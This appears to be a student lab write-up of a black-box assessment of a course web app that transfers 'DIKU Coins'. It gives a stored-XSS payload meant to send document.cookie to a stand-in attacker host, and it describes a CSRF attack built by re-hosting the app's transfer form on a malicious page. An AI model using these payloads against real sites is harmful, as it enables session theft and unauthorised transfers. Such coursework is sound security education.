Part 1: Black Box Assessment
----------------------------

## Attack A. Cookie Theft

The cookie theft is done by writing up in the message input the following line message:

	`Any message we want</p>
	<SCRIPT type="text/javascript">
		var adr = "http://www.cookiegrabber.com/evil.php?cookie=" + escape(document.cookie);
	</SCRIPT>
	<p>`

Because the form inputs are not sanitised or checked in any way by the server we can save the message in the databese like it is. If in a Second-Order SQL Injection the data stored in database is later used to conduct SQL injection, In this case we might say that this is a Second-Order cookie hijacking because we get the session token when the user clicks on our message and renders the HTML page with our script. Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack.

## Attack B. Cross-Site Request Forgery

In the transfer page we have this form for transfering coins:

	`<form method="POST" name="transferform" action="/transfer.php">
		<p>Send <input name="coins" value="" size="5" type="text"> DIKU Coins</p>
		<p>to <input name="recipient" value="" type="text"></p>
		<input name="submission" value="Send" type="submit">
	</form>`

We will need to modify this form and place it into our malicious webpage. The solution for type of attack can be found in the `malicious.html` docoument
